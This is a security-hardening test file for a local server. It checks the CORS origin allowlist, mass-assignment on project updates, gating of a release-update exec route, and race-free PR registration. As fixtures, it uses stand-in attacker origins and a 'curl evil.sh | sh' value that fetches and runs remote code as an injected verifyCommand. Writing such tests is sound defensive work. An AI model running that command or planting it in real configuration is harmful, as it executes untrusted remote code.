/**
 * Security hardening — EPIC 4c3c2018 (full-scan findings, 2026-06-27).
 *
 * Server-side findings (the hub findings live in packages/hub). Functional REST
 * tests where the vuln is reachable without external CLIs; source-level
 * assertions for the shell-injection sites that only execute once `gh`/`jira`
 * are configured (so the argv/allowlist shape is what we pin down).
 */
import { describe, it, expect, beforeAll, afterAll, vi } from 'vitest';
import request from 'supertest';
import { app, initStorage, isAllowedOrigin, setReleasesUpdateExecImpl, resetReleasesUpdateExecImpl } from '../server';
import * as fs from 'fs';
import * as os from 'os';
import * as path from 'path';

// Mockable homedir (item 9c297075): the verify-token read below then comes
// from the sandbox under any runner — never the real ~/.agenfk/verify-token.
vi.mock('os', async (importOriginal) => {
  const actual = await importOriginal<typeof import('os')>();
  return { ...actual, homedir: vi.fn(() => actual.homedir()) };
});
const sandboxHome = fs.mkdtempSync(path.join(os.tmpdir(), 'agenfk-sec-hardening-'));
fs.mkdirSync(path.join(sandboxHome, '.agenfk'), { recursive: true });
vi.mocked(os.homedir).mockReturnValue(sandboxHome);

const TEST_DB = path.resolve('./security-hardening-test-db.sqlite');
const VERIFY_TOKEN = (() => {
  try { return fs.readFileSync(path.join(os.homedir(), '.agenfk', 'verify-token'), 'utf8').trim(); }
  catch { return ''; }
})();

beforeAll(async () => {
  process.env.AGENFK_DB_PATH = TEST_DB;
  if (fs.existsSync(TEST_DB)) fs.unlinkSync(TEST_DB);
  await initStorage();
});

afterAll(() => {
  for (const suffix of ['', '-wal', '-shm']) {
    const f = TEST_DB + suffix;
    if (fs.existsSync(f)) fs.unlinkSync(f);
  }
});

// ── bug 55229bae: localhost bind + CORS origin allowlist ──────────────────────
describe('bug 55229bae: CORS origin allowlist (no wildcard)', () => {
  it('allows requests with no Origin (CLI, curl, server-to-server)', () => {
    expect(isAllowedOrigin(undefined)).toBe(true);
    expect(isAllowedOrigin('')).toBe(true);
  });
  it('allows loopback origins on any port', () => {
    expect(isAllowedOrigin('http://localhost:5173')).toBe(true);
    expect(isAllowedOrigin('http://127.0.0.1:3000')).toBe(true);
    expect(isAllowedOrigin('http://localhost')).toBe(true);
    expect(isAllowedOrigin('https://127.0.0.1:8080')).toBe(true);
    expect(isAllowedOrigin('http://[::1]:3000')).toBe(true);
  });
  it('rejects non-loopback origins', () => {
    expect(isAllowedOrigin('http://evil.com')).toBe(false);
    expect(isAllowedOrigin('https://attacker.example')).toBe(false);
    // look-alikes must not slip through
    expect(isAllowedOrigin('http://localhost.evil.com')).toBe(false);
    expect(isAllowedOrigin('http://127.0.0.1.evil.com')).toBe(false);
  });
});

// ── bug e60e20aa: mass-assignment on PUT /projects/:id ────────────────────────
describe('bug e60e20aa: PUT /projects/:id is not mass-assignable', () => {
  it('ignores verifyCommand / projectRoot / flowId on the open route', async () => {
    const project = (await request(app).post('/projects').send({ name: 'MassAssign' })).body;
    const res = await request(app).put(`/projects/${project.id}`).send({
      name: 'Renamed',
      verifyCommand: 'curl evil.sh | sh',
      projectRoot: '/etc',
      flowId: 'attacker-flow',
    });
    expect(res.status).toBe(200);
    expect(res.body.name).toBe('Renamed');
    expect(res.body.verifyCommand).toBeUndefined();
    expect(res.body.projectRoot).toBeUndefined();
    expect(res.body.flowId).toBeUndefined();
  });
  it('rejects a body with no allowlisted fields', async () => {
    const project = (await request(app).post('/projects').send({ name: 'NoFields' })).body;
    const res = await request(app).put(`/projects/${project.id}`).send({ verifyCommand: 'x' });
    expect(res.status).toBe(400);
  });
  it('verify-command endpoint requires the internal token', async () => {
    const project = (await request(app).post('/projects').send({ name: 'VC' })).body;
    const unauth = await request(app).put(`/projects/${project.id}/verify-command`).send({ verifyCommand: 'npm test' });
    expect(unauth.status).toBe(401);
  });
  it('verify-command endpoint sets the command with the internal token', async () => {
    if (!VERIFY_TOKEN) return; // token only present on installed machines
    const project = (await request(app).post('/projects').send({ name: 'VC2' })).body;
    const ok = await request(app)
      .put(`/projects/${project.id}/verify-command`)
      .set('x-agenfk-internal', VERIFY_TOKEN)
      .send({ verifyCommand: 'npm run build && npm test' });
    expect(ok.status).toBe(200);
    expect(ok.body.verifyCommand).toBe('npm run build && npm test');
  });
});

// ── bug 968259c4: POST /releases/update RCE trigger gated ─────────────────────
describe('bug 968259c4: /releases/update requires the forced-preflight header', () => {
  afterAll(() => resetReleasesUpdateExecImpl());
  it('refuses without x-agenfk-ui (no exec)', async () => {
    let ran = false;
    setReleasesUpdateExecImpl(((..._a: any[]) => { ran = true; return { on() {}, stdout: { on() {} }, stderr: { on() {} } } as any; }) as any);
    const res = await request(app).post('/releases/update');
    expect(res.status).toBe(403);
    expect(ran).toBe(false);
  });
  it('accepts with x-agenfk-ui', async () => {
    setReleasesUpdateExecImpl(((..._a: any[]) => ({ on() {}, stdout: { on() {} }, stderr: { on() {} } }) as any) as any);
    const res = await request(app).post('/releases/update').set('x-agenfk-ui', '1');
    expect(res.status).toBe(202);
    expect(res.body.jobId).toBeTruthy();
  });
});

// ── bug fe03d054: POST /prs idempotency is race-free (atomic upsert) ──────────
describe('bug fe03d054: POST /prs decides newness from the upsert', () => {
  const body = (n: number) => ({ itemId: 'item-x', prNumber: n, repo: 'o/r', model: 'claude-opus-4-8', harness: 'claude-code' });
  it('concurrent first-registrations converge on one row id', async () => {
    const calls = await Promise.all(
      Array.from({ length: 5 }, () => request(app).post('/prs').send(body(4242))),
    );
    for (const c of calls) expect(c.status).toBe(201);
    const ids = new Set(calls.map((c) => c.body.id));
    expect(ids.size).toBe(1); // all observed the same persisted row, not 5 distinct "opens"
  });
  it('re-registration returns the same row (idempotent)', async () => {
    const first = await request(app).post('/prs').send(body(4343));
    const second = await request(app).post('/prs').send(body(4343));
    expect(second.body.id).toBe(first.body.id);
  });
});

// NB: source-string guards for the shell/command-injection sites (registry
// publish, GET /github/issues, POST /github/import, JQL escaping) were removed in
// the behaviour-based-testing conversion (CGLAB-16). They asserted the *shape* of
// server.ts (execFileSync-not-execSync, allowlist literals) rather than runtime
// behaviour, and the sites only execute once `gh`/`jira` are configured — the
// routes 400 at the config check before the guarded input is reached, so the
// invariant is not reachable via a request in-process. These invariants are owned
// by the security-review process, not by grepping source. The injection-reachable
// defenses that ARE exercisable in-process (CORS origin allowlist, PUT /projects
// mass-assignment, /releases/update gating, POST /prs idempotency) remain tested
// behaviourally above.
